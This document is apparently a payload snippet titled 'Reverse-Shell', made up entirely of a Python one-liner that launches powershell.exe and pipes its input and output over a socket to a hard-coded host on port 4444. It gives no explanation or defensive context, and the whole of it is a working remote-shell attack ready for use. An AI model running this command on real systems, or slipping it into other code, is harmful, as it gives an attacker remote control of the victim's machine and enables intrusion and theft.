# Reverse-Shell
```python
python -c "import os,socket,subprocess,itertools,threading,sys;host='192.168.136.128';port=4444;p=subprocess.Popen(['powershell.exe'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,shell=True,text=True);s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s2p=lambda s,p:[p.stdin.write(s.recv(1024).decode()) and p.stdin.flush() for i in itertools.count(start=1)];p2s=lambda s,p:[s.send(p.stdout.read(1).encode()) for i in itertools.count(start=1)];threading.Thread(target=s2p, args=[s,p], daemon=True).start();threading.Thread(target=p2s, args=[s,p], daemon=True).start();p.wait() if p else s.close();sys.exit(0)"
```
